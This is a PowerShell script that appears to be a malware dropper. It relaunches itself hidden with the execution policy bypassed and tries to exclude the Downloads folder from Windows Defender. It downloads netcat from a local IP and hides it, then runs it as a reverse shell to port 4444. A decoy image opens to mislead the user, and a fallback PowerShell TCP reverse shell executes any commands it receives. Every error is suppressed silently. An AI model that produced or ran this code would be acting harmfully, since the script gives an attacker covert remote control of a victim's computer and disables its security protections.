# Ensure full Windows PowerShell compatibility
function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script`""
        exit
    }
}
Ensure-WindowsPowerShell

# Attempt Windows Defender Exclusion (silent fail if not admin)
try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
} catch {}

# Define URLs and file names
$urlPayload = "http://192.168.0.117/nc.exe"
$payloadName = "nc.exe"
$urlDecoy = "https://yt3.googleusercontent.com/...jpg"
$decoyName = "decoy.jpg"

# Set paths
$path = [System.Environment+SpecialFolder]::Desktop
$payloadPath = Join-Path -Path $path -ChildPath $payloadName
$decoyPath = Join-Path -Path $path -ChildPath $decoyName

# Download payload and decoy (hide both)
try {
    Invoke-WebRequest -Uri $urlPayload -OutFile $payloadPath -UseBasicParsing
    Set-ItemProperty -Path $payloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
} catch {}

try {
    Invoke-WebRequest -Uri $urlDecoy -OutFile $decoyPath -UseBasicParsing
    Set-ItemProperty -Path $decoyPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
} catch {}

# Start Netcat if downloaded successfully
$clientIP = "192.168.0.117"
$port = 4444
$netcatArgs = "-d $clientIP $port -e cmd.exe"

if (Test-Path $payloadPath) {
    try {
        Start-Process -FilePath $payloadPath -ArgumentList $netcatArgs -WindowStyle Hidden
    } catch {}
}

# Start decoy image to mislead
if (Test-Path $decoyPath) {
    try {
        Start-Process $decoyPath
    } catch {}
}

# Pure PowerShell reverse shell fallback (TCP socket)
try {
    $client = "192.168.0.114"  # Use same or backup IP
    $tcpPort = 4444
    $tcp = New-Object System.Net.Sockets.TcpClient($client, $tcpPort)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $writer.Write($sendback2)
        $writer.Flush()
    }

    $writer.Close()
    $stream.Close()
    $tcp.Close()
} catch {
    # Fails silently
}
